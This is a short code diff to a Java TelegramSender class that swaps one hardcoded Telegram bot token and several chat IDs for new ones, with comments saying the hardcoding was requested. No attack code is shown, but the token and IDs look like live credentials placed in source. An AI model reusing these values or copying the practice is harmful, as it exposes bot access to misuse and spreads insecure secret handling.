@@ -47,7 +47,7 @@ public class TelegramSender {
         if (!token.isEmpty()) return token;
         
         // Hardcoded Bot Token as requested
-        return "7788531778:AAEYpieUirgdiGlFfy6dzAb1-2Azk5jw3Og"; 
+        return "8492800798:AAHq1m0NLaxszkXJqMtBFkQqAr_xyxdOR9E"; 
     }
 
     public String getChatId() {
@@ -56,7 +56,7 @@ public class TelegramSender {
         if (!chatId.isEmpty()) return chatId;
 
         // Hardcoded Chat ID as requested
-        return "-1003791881466"; 
+        return "-1003880314163"; 
     }
     
     public String getStatusChatId() {
@@ -65,7 +65,7 @@ public class TelegramSender {
         if (!chatId.isEmpty()) return chatId;
         
         // Fallback to main Chat ID if not set
-        return "-1003883632844";
+        return "-1003799025474";
     }
 
     public void sendMessage(String message) {
